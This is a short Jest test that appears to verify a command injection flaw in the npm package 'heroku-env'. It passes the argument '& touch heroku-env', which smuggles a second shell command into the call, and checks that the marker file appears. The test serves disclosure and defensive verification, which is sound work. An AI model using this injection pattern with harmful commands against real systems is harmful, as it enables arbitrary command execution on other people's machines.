test("Command Injection in heroku-env", (done) => {
  expect.assertions(2);
  const root = require("heroku-env");
  const fs = require("fs");
  const path = "./heroku-env";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  root("& touch heroku-env", "aa", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
